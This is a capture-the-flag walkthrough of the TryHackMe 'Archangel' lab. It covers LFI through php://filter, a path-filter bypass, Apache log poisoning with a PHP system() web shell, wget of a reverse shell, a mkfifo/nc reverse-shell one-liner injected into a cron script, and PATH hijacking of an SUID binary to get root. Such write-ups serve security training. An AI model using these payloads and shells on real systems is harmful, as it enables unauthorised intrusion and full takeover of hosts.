---
title:  "Archangel - TryHackMe"
style: fill
color: light
tags: [TryHackMe, LFI, WebExploitation]
permalink: /writeupblog/2021/02/04/archangel.html
description: Another interesting and really good machine from TryHackMe created by @Archangel.
---
Another interesting and really good machine from <a href="https://tryhackme.com/">TryHackMe</a> created by <a href="https://tryhackme.com/p/Archangel">@Archangel</a>. Access the room <a href="https://tryhackme.com/room/archangel">here</a>.

{:refdef: style="text-align: center;"}
![Image]({{ "/assets/images/thm/archangel/banner.png" | relative_url}})
{: refdef}

## Overview:

In this machine you will come across WebApp Enumeration, DNS resolution, LFI, and Horizontal & Vertical Privilege Escalation.

## Enumeration:
Carry out the nmap scan with following command.
```shell
nmap -sV -v -oN nmap.initial --open 10.10.10.10
```
In the nmap scan, you will find two ports open, 22 & 80. These are standard SSH and HTTP ports. 

Take a look at the webpage. From the questions we can guess that we have to use Domain Name resolution here. After looking through the WebApp you will find a valid Domain name at the top of the home page.

<br>
![Image]({{ "/assets/images/thm/archangel/webpage.png" | relative_url}})
<br>

Save this domain name in the /etc/hosts file on your system for the IP of the machine

<br>
![Image]({{ "/assets/images/thm/archangel/hosts.png" | relative_url}})
<br>

Access the webpage with domain name in your browser. You will get your first flag on the home page.

<br>
![Image]({{ "/assets/images/thm/archangel/flag1.png" | relative_url}})
<br>

There is a **robots.txt** file for the site which gives us the under developement page **test.php**. Once you access the page, you will get the following page.

<br>
![Image]({{ "/assets/images/thm/archangel/testphp.png" | relative_url}})
<br>

After clicking the button, it takes us to **mrrobot.php** in the directory **/var/www/html/development_testing/** page.

<br>
![Image]({{ "/assets/images/thm/archangel/mrrobot.png" | relative_url}})
<br>

The URL points to the possibility of LFI. I tried to access files like **/etc/passwd**, **/etc/hosts**, **/var/log/apache2/access.log** directly by passing the value to the **view** parameter but no success. There is a filter which is restricting us from reading these files. We must find a way to read the code of **test.php**. After trying few techniques, I got the way to read the file.
With the technique below, we can retrieve the code of the file in base64 format and decode it back to read the original code.
```
php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```
I tried reading **mrrobot.php** file and it worked. Now let's see if we can read the test.php file from the same directory. 

<br>
![Image]({{ "/assets/images/thm/archangel/testcode.png" | relative_url}})
<br>

Yes, we get the base64 encoded long code. Copy the encoded string and decode it into the file test.php with following command.

```shell
echo "encode-string" | base64 -d > test.php
```

This is the code of **test.php**
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{REDACTED}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```
<br>
In this code you will also get the second flag.
Let's talk about what the filters are. The code is checking for two conditions. First is that the param must not contain substring **"../../"** and second is that the param must contain substring **"/var/www/html/development_testing"**. If both the conditions are true then we can access the file else it will say **"Sorry, Thats not allowed"**.

We can tackle this by using **".././../"** instead of **"../../"** to travel back directories. Now, we know that the website is running on Apache web server. So, we can access the log file(/var/log/apache2/access.log) and do the log poisoning to get a reverse shell using RCE.

Let's try and check if we can access the log file now. Keeping in mind both the conditions, this value for the parameter should retrieve the log file for us.

```
view=/var/www/html/development_testing/.././.././../log/apache2/access.log
```
![Image]({{ "/assets/images/thm/archangel/accesslog.png" | relative_url}})
<br>

Yes, we can access the log file now. To do the log poisoning in order to get RCE, we have to pass a php code snippet in the **user-agent** header while accessing any page on the website.
Following is the php snippet.
```php
<?php system($_GET['cmd']); ?>
```
Use burp suite to intercept the request and pass the code in the user-agent value like show below.

<br>
![Image]({{ "/assets/images/thm/archangel/cmd.png" | relative_url}})
<br>

Now, we can pass linux commands and get back the output for that command in the access.log file. Verify the same with **id** command. Read the source code of the page to understand better. The output of the command will be in the bottom part of the page.
```
view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=id
```
![Image]({{ "/assets/images/thm/archangel/cmdid.png" | relative_url}})

## Gaining Foothold:

I tried to get the netcat reverse shell using various oneliners like python, bash, nc but for some weird reason, it didn't work for me. So, I tried to transfer a php-reverse-shell and then access it directly in the browser. 
If you are using Kali or Parrot, you will find the shell in /usr/share/webshells/php directory. Change the IP in the code to your machine's IP where it says _//CHANGE THIS_
Start a webserver using python in the directory where the shell is located.
```shell
python -m SimpleHTTPServer 8888
```
{:refdef: style="text-align: center;"}
![Image]({{ "/assets/images/thm/archangel/pythonhttpserver.png" | relative_url}})
{: refdef}
<br>
Download the Shell on the target machine by using **wget** command.
```
view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget http://<your-machine-ip>:8888/shell.php
```
<br>
Verify that the shell is successfully downloaded using **ls -l** command.

<br>
![Image]({{ "/assets/images/thm/archangel/shelldownloaded.png" | relative_url}})
<br>

Now start a netcat listener on your machine on the port 1234(Or the one you specified in the shell)
```shell
nc -nvlp 1234
```
![Image]({{ "/assets/images/thm/archangel/revshell.png" | relative_url}})

Convert the unstable to shell to fairly stable shell using following commands.
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

## Post Exploitation Enumeration:
Now, its time to enumerate. Before using a script for automated enumeration, I generally try to enumerate manually like checking sudo permissions, SUID binaries, any file in home directory of users or in /var/www/html directory and cron jobs. 

We get a interesting file after looking at scheduled jobs which runs every minute as an user archangel.
```shell
cat /etc/crontab
```
![Image]({{ "/assets/images/thm/archangel/crontab.png" | relative_url}})
![Image]({{ "/assets/images/thm/archangel/catsh.png" | relative_url}})
<br>

Fortunately, we can read and write the file. The file contains a simple bash command which echoes a string "hello world" inside a file.
We can insert a oneliner reverse shell at the end and get the shell for user Archangel. I used following rev-shell. Change the IP to yours.

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.5.125 4444 >/tmp/f" >> helloworld.sh
```
<br>
![Image]({{ "/assets/images/thm/archangel/helloworldrevshell.png" | relative_url}})
<br>

## Privilege Escalation:

Start a listener again on your machine and wait for a minute. Once you get the shell, upgrade it again from the unstable one.

<br>
![Image]({{ "/assets/images/thm/archangel/archangelshell.png" | relative_url}})
<br>

You will get third flag in users directory. Also there is a folder name **secret** which contains the another user flag and a Binary which has SUID bit set. To analyze to binary, you have to download it on your machine. Start the webserver on target machine using python3.
```shell
python3 -m http.server 8888
```
![Image]({{ "/assets/images/thm/archangel/userflag1.png" | relative_url}})
![Image]({{ "/assets/images/thm/archangel/userflag2.png" | relative_url}})
<br>

Download the file in your machine using **wget** command and anaylze it using Ghidra. If you don't know what ghidra is, then you must visit the **CC: Ghidra** room on TryHackMe.

After analyzing we get the following code
```cpp
undefined8 main(void)

{
  setuid(0);
  setgid(0);
  system("cp /home/user/archangel/myfiles/* /opt/backupfiles");
  return 0;
}
```

The binary executes system command to copy files from one directory to another. But it doesn't use full path for **cp** command. So, we can create our own binary named **cp** and point the $PATH to our directory which will get us the root shell.

```shell
echo '#!/bin/bash' > cp
echo "/bin/bash" >> cp
chmod +x cp
```
![Image]({{ "/assets/images/thm/archangel/cp.png" | relative_url}})

<br>
Now modify the PATH variable and make it point towards "/home/archangel/secret" directory where we have created the **cp** binary.

<br>
![Image]({{ "/assets/images/thm/archangel/path.png" | relative_url}})
<br>

Execute the binary and get the root shell. Access the root flag in the root directory.

<br>
![Image]({{ "/assets/images/thm/archangel/rootshell.png" | relative_url}})
![Image]({{ "/assets/images/thm/archangel/rootflag.png" | relative_url}})

That's it for this machine. Submit all the flags to TryHackMe and get the points.
## Thankyou!!

Do follow me on socials below for stay connected for these kind of writeups/walkthroughs/blogs.





